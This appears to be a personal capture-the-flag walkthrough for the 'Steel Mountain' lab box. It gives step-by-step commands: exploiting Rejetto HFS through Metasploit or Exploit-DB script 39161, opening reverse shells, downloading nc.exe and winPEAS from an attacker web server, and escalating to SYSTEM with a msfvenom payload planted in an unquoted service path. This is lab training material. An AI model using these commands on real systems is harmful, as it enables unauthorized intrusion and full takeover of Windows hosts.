<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>steel mountain</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>steel mountain</h1><br/><strong>Steel Mountain</strong><br /><br />Hello<br /><br />nmap -Pn -T4 -sV 10.10.118.196<br /><br /><img src="images/5-1.png" alt="images/5-1.png" /><br /><br /><br /><img src="images/5-2.png" alt="images/5-2.png" /><br /><br /><strong>Foothold:<br />Way -1:<br />Metasploit:</strong><br /><br />Search HTTP File Server<br /><em><strong>exploit/windows/http/rejetto_hfs_exec</strong></em><br /><br />set options for:<br />RHOST - Target_IP<br />RPORT - Target_Port<br /><br />SRVHOST -Attacker IP to start webserver (Optional)<br />SRVPORT -Attacker Port to Start websever (Optional)<br /><br />Set Payload:<br />windows/meterpreter/reverse_tcp<br />LHOST - Attacker IP<br />LPORT - Attacker Port to Listen for reverse shell<br /><br /><br />Run/exploit <br /><br /><br />With the received meterpreter session.<br />Get the user flag at C:\Users\Bill\Desktop\user.txt<br /><br /><br /><strong>Way-2:<br />Python Code from Exploit-DB:</strong><br /><br /><em><strong>searchsploit -m windows/remote/39161.py</strong></em><br /><br />1. Edit the file and change the <em><strong>Local IP address</strong></em> and <em><strong>Local Port</strong></em> inside the file to Attacker Details.<br />2. Download netcat.exe for windows and name it to nc.exe.<br />3. Host nc.exe as it will be accessible as <em><strong>http://&lt;attackers_ip&gt;:80/nc.exe</strong></em><br />		From the downloaded/renamed location run <em><strong>python2 -m SimpleHTTPServer 80</strong></em><br />4. Start nc on attacker on listen mode(As per port provided in the python file)<br />		<em><strong>nc -lvnp Local Port</strong></em><br />5. Run the exploit using python2: <em><strong>python2 39161.py &lt;target_IP&gt; &lt;Target_Port&gt;</strong></em><br /><br />We will get limited powershell on nc listener with user preveleges.<br /><br /><strong>Prevelege Escalation:</strong><br /><br />Either using meterpreter upload <strong>PowerUp.ps1</strong> or <strong>WinPEASx64.exe</strong><br />Then go into a powershell instance by following:<br /><br /><strong>Meterpterter Commands to Interact with Powershell:</strong><br /><em><strong>load powershell	</strong></em>							:	Loads the powershell extention of meterpreter<br /><em><strong>powershell_shell	</strong></em>							:	Starts a powershell in the target machine.<br /><br />Or<br /><br />For normal shell use the following to upload the files.<br />	1. Start a webserver where the exectuibles are located by: <em><strong>python2 -m SimpleHTTPServer 80</strong></em><br />	2. <em><strong>powershell -c Invoke-WebRequest -Uri &lt;URL&gt; -OutFile </strong></em><strong>&lt;OUTPUT-FILENAME&gt;</strong><br />		eg. <em><strong>powershell -c Invoke-WebRequest -Uri http://10.11.72.31/THM_WinPrivEsc_Tools/winPEASx64.exe -OutFile winPEASx64.exe</strong></em><br />		<br /><br /><strong>Powershell commands to add a module and run it:</strong><br /><br /><strong>Import-Module .\PowerUp.ps1</strong><br /><strong>Invoke-AllChecks</strong><br />or<br /><strong>. .\PowerUp.ps1</strong><br /><strong>Invoke-AllChecks</strong><br /><br /><img src="images/5-3.png" alt="images/5-3.png" /><br /><br />We use  the unquoted service path vulnerability for <strong>AdvancesSystemCareService9</strong>. The service also has <strong>CanRestrat True</strong>.<br />Thus we can stop and start the service after we inject our payload to the <strong>C:\Program Files (x86)\IObit</strong> Directory<br /><br /><strong>Name of Payload: Advanced.exe</strong><br /><em><strong>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.X.X PORT=XXXX -e x86/shikata_ga_nai -f exe-service -o Advanced.exe</strong></em><br /><br />Copy this <strong>Advanced.exe</strong> to <strong>C:\Program Files (x86)\IObit</strong>.<br />Open a reverse shell listener on attacker PC.<br /><br />Then restart the service as follows:<br /><br /><em><strong>sc stop AdvancesSystemCareService9</strong></em><br /><em><strong>sc start AdvancesSystemCareService9</strong></em><br /><br />Now we have <strong>nt authority\system</strong> shell in the listener.<br />Get the flag from <strong>C:\Users\Administrator\Desktop\root.txt</strong><br /><br />Note: if we use <strong>WinPEASx64.exe</strong>, we get the same hints about unquoted service path vulnerability and exploit the same way.<br /><br />Thanks!!</div>
</body>
</html>
